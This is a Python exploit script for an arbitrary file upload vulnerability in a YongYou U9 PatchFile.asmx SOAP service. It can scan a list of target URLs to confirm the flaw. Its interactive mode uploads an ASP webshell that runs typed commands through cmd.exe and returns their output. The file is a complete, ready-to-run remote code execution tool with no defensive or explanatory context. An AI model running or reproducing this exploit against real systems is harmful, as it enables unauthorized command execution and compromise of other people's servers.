import requests
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
import base64
import json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/CS/Office/AutoUpdates/PatchFile.asmx")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
         "Content-Type": "text/xml; charset=utf-8"
    }
    random_str = generate_random_string(10)
    base_random_str = base64.b64encode(random_str.encode("utf-8")).decode("utf-8")
    ver_data = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <SaveFile xmlns="http://tempuri.org/">
          <binData>{}</binData>
          <path>./</path>
          <fileName>test.txt</fileName>
        </SaveFile>
      </soap:Body>
    </soap:Envelope>""".format(base_random_str)
    try:
        upresponse = requests.post(target, headers=headers, data=ver_data, verify=False)
        if upresponse.status_code == 200 and 'true' in upresponse.text and 'SaveFile' in upresponse.text:
            text_url = urljoin(url, "/CS/Office/AutoUpdates/test.txt")
            text_response = requests.get(text_url,verify=False)
            if text_response.status_code == 200 and random_str in text_response.text:
                print(f"\033[31mDiscovered:{url}: YongYouU9_PatchFile_ArbitraryFileUpload!\033[0m")
                return True
    except Exception as e:
        print(e)


def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/CS/Office/AutoUpdates/PatchFile.asmx")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "text/xml; charset=utf-8"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            shell = """<%\r\nResponse.write CreateObject("wscript.shell").exec("cmd.exe /c {}").StdOut.ReadAll\r\nCreateObject("Scripting.FileSystemObject").DeleteFile(Server.MapPath(Request.ServerVariables("SCRIPT_NAME")))\r\n%>""".format(command)
            shellbase64 = base64.b64encode(shell.encode("utf-8")).decode()
            ver_data = """<?xml version="1.0" encoding="utf-8"?>
                <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                  <soap:Body>
                    <SaveFile xmlns="http://tempuri.org/">
                      <binData>{}</binData>
                      <path>./</path>
                      <fileName>klmnsdto.asp</fileName>
                    </SaveFile>
                  </soap:Body>
                </soap:Envelope>""".format(shellbase64)
            if "exit" not in command:
                try:
                    upresponse = requests.post(target, verify=False, headers=headers, data=ver_data, timeout=15)
                    if upresponse.status_code == 200 and 'true' in upresponse.text and 'SaveFile' in upresponse.text:
                        text_url = urljoin(url, "/CS/Office/AutoUpdates/klmnsdto.asp")
                        text_response = requests.get(text_url, verify=False)
                        if text_response.status_code == 200:
                            print(text_response.text)
                except Exception as e:
                    pass
            else:
                print("\033[93mThe tested webshell has been automatically deleted\033[0m")
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")